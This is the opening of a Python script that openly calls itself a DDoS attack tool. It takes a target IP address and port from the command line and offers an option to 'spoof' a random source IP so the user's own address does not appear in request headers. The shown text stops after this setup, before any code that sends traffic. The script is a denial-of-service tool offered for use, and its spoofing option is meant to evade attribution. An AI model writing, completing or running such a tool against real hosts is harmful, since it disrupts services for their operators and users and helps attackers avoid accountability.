import socket
import sys
import threading
import argparse
import ipaddress
import random


def ip_address(ip):
    try:
        return ipaddress.ip_address(ip)
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid IP address {ip}")


parser = argparse.ArgumentParser(description='DDoS attack script using simulated multithreading')
parser.add_argument('-t', '--target', type=ip_address, required=True, help="Target IP address")
parser.add_argument('-p', '--port', type=int, required=True, help="The port the script will attack. eg: 80 <--> (http)")
parser.add_argument('-s', '--spoof', action='store_true', help='Use a spoofed random IP address')

args = parser.parse_args()

if args.spoof:
    fip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    fip = ip_address(fip)
else:
    print('[-] Warning: Using your IP address in the request headers. Use -s to spoof your IP.')